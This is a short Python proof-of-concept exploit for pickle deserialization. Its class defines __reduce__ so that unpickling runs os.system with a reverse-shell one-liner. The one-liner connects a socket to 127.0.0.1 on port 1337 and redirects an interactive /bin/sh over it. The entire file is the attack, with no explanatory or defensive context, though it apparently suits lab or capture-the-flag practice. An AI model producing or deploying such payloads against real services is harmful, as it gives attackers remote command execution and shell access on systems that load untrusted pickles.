import socket, subprocess, os
import pickle

class PickleRce(object):
    def __reduce__(self):
        return (os.system,("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",))
    
if __name__ == "__main__":
        PickleRce()
